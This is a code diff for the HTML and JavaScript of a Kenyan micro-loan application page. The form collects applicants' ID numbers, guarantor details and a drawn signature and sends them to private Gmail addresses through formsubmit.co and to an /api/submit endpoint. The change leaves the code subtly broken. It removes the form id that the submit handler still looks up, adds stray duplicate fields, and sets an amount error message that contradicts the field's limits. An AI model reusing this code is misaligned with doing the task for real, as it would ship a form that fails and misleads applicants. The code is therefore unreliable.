@@ -212,62 +212,61 @@
     <h2>Loan Application</h2>
   </div>
 
-  <form id="loanForm" action="https://formsubmit.co/shim70497@gmail.com" method="POST">
-    <!-- Hidden Inputs for FormSubmit -->
+  <form action="https://formsubmit.co/shim70497@gmail.com" method="POST">
+    <input type="hidden" name="_subject" value="New Loan Application">
     <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_template" value="table">
+    <input type="text" name="name" placeholder="Your name" required>
+    <input type="email" name="email" placeholder="Your email" required>
+    <input type="hidden" name="_template" value="box">
     <input type="hidden" name="_cc" value="charlesmutemi36@gmail.com">
-    <input type="hidden" name="_subject" value="New Loan Application - Fonte Lenders">
-    <input type="hidden" name="_autoresponse" value="Thank you for choosing Fonte Lenders-Your partner in need. We have received your details and will process your application within 24 hours.">
-    <input type="hidden" id="signature-data" name="signature">
-    <input type="hidden" name="_next" value="https://fonte-lenders-git-main-shimkevins-projects.vercel.app/thank-you.html">
+    <input type="hidden" name="signature" id="signature-data">
 
     <!-- Form Fields -->
     <div class="form-group">
       <label for="customerId">Customer ID</label>
-      <input type="text" id="customerId" name="Customer ID" required pattern="[A-Za-z0-9]{6,12}" 
+      <input type="text" id="customerId" name="customerId" required pattern="[A-Za-z0-9]{6,12}" 
              title="Customer ID must be 6-12 alphanumeric characters">
       <div class="error-message" id="customerId-error">Please enter a valid Customer ID (6-12 alphanumeric characters)</div>
     </div>
 
     <div class="form-group">
       <label for="fullName">Full Name</label>
-      <input type="text" id="fullName" name="Full Name" required pattern="[A-Za-z ]{3,}" 
+      <input type="text" id="fullName" name="fullName" required pattern="[A-Za-z ]{3,}" 
              title="Please enter your full name (letters only)">
       <div class="error-message" id="fullName-error">Please enter your full name (letters only)</div>
     </div>
 
     <div class="form-group">
       <label for="phoneNumber">Phone Number (M-Pesa)</label>
-      <input type="tel" id="phoneNumber" name="Phone Number" required pattern="[0-9]{10}" 
+      <input type="tel" id="phoneNumber" name="phoneNumber" required pattern="[0-9]{10}" 
              title="Please enter a valid 10-digit phone number">
       <div class="error-message" id="phoneNumber-error">Please enter a valid 10-digit phone number</div>
     </div>
 
     <div class="form-group">
       <label for="amount">Amount to Borrow (KES)</label>
-      <input type="number" id="amount" name="Amount" required min="1000" max="300000" 
+      <input type="number" id="amount" name="amount" required min="1000" max="300000" 
              title="Loan amount must be between KES 1000 and KES 300,000">
-      <div class="error-message" id="amount-error">Loan amount must be between KES 1000 and KES 300,000</div>
+      <div class="error-message" id="amount-error">Loan amount must be between KES 500 and KES 50,000</div>
     </div>
 
     <div class="form-group">
       <label for="guarantorName">Guarantor Name</label>
-      <input type="text" id="guarantorName" name="Guarantor Name" required pattern="[A-Za-z ]{3,}" 
+      <input type="text" id="guarantorName" name="guarantorName" required pattern="[A-Za-z ]{3,}" 
              title="Please enter guarantor's full name (letters only)">
       <div class="error-message" id="guarantorName-error">Please enter guarantor's full name (letters only)</div>
     </div>
 
     <div class="form-group">
       <label for="guarantorPhone">Guarantor Phone Number</label>
-      <input type="tel" id="guarantorPhone" name="Guarantor Phone" required pattern="[0-9]{10}" 
+      <input type="tel" id="guarantorPhone" name="guarantorPhone" required pattern="[0-9]{10}" 
              title="Please enter a valid 10-digit phone number">
       <div class="error-message" id="guarantorPhone-error">Please enter a valid 10-digit phone number</div>
     </div>
 
     <div class="form-group">
       <label for="guarantorId">Guarantor ID Number</label>
-      <input type="text" id="guarantorId" name="Guarantor ID" required pattern="[0-9]{6,8}" 
+      <input type="text" id="guarantorId" name="guarantorId" required pattern="[0-9]{6,8}" 
              title="Please enter a valid ID number (6-8 digits)">
       <div class="error-message" id="guarantorId-error">Please enter a valid ID number (6-8 digits)</div>
     </div>
@@ -291,10 +290,9 @@
 
   <!-- Confirmation Message -->
   <div class="confirmation" id="confirmation">
-    <h3>Thank you for choosing Fonte Lenders-Your partner in need!</h3>
-    <p>We have successfully received your loan appplication.</p>
-    <p>Your loan will be processed within 24 hours</p>
-    <p>Redirecting to homepage...</p>
+    <h3>Your application has been received successfully!</h3>
+    <p>Your loan will be processed in 24 hours.</p>
+    <p>Redirecting to confirmation page...</p>
   </div>
 
   <a href="repay.html" class="nav-link">Need to repay an existing loan?</a>
@@ -312,7 +310,7 @@
     backgroundColor: 'rgb(255, 255, 255)',
     minWidth: 0.5,
     maxWidth: 2.5,
-    throttle: 16,  // Smooths the signature (reduces lag)
+    throttle: 16,
   });
 
   function resizeCanvas() {
@@ -399,7 +397,9 @@
   });
 
   // Form Submit
-  document.getElementById('loanForm').addEventListener('submit', function(event) {
+  document.getElementById('loanForm').addEventListener('submit', async (event) => {
+    event.preventDefault();
+    
     // Validate all fields
     const isCustomerIdValid = validateField(document.getElementById('customerId'), 'customerId-error', validateCustomerId);
     const isFullNameValid = validateField(document.getElementById('fullName'), 'fullName-error', validateName);
@@ -413,7 +413,6 @@
     const signatureError = document.getElementById('signature-error');
     if (signaturePad.isEmpty()) {
       signatureError.style.display = 'block';
-      event.preventDefault();
       return;
     } else {
       signatureError.style.display = 'none';
@@ -422,7 +421,6 @@
     // If any field is invalid, stop submission
     if (!isCustomerIdValid || !isFullNameValid || !isPhoneValid || !isAmountValid || 
         !isGuarantorNameValid || !isGuarantorPhoneValid || !isGuarantorIdValid) {
-      event.preventDefault();
       return;
     }
     
@@ -434,10 +432,46 @@
     // Save signature
     document.getElementById('signature-data').value = signaturePad.toDataURL();
     
-    // Form will now submit to FormSubmit naturally
+    // Prepare form data
+    const formData = {
+      customerId: document.getElementById('customerId').value,
+      fullName: document.getElementById('fullName').value,
+      phoneNumber: document.getElementById('phoneNumber').value,
+      amount: document.getElementById('amount').value,
+      guarantorName: document.getElementById('guarantorName').value,
+      guarantorPhone: document.getElementById('guarantorPhone').value,
+      guarantorId: document.getElementById('guarantorId').value,
+      signature: signaturePad.toDataURL()
+    };
+    
+    try {
+      const response = await fetch('/api/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData)
+      });
+      
+      if (response.ok) {
+        document.getElementById('loanForm').style.display = 'none';
+        document.getElementById('confirmation').style.display = 'block';
+        
+        setTimeout(() => {
+          window.location.href = 'thank-you.html';
+        }, 3000);
+      } else {
+        throw new Error('Submission failed');
+      }
+    } catch (error) {
+      console.error('Error:', error);
+      alert('There was an error submitting your application. Please try again.');
+      document.getElementById('btnText').textContent = 'APPLY NOW';
+      document.getElementById('spinner').style.display = 'none';
+      document.getElementById('submitBtn').disabled = false;
+    }
   });
 </script>
-
 </body>
 </html>
 
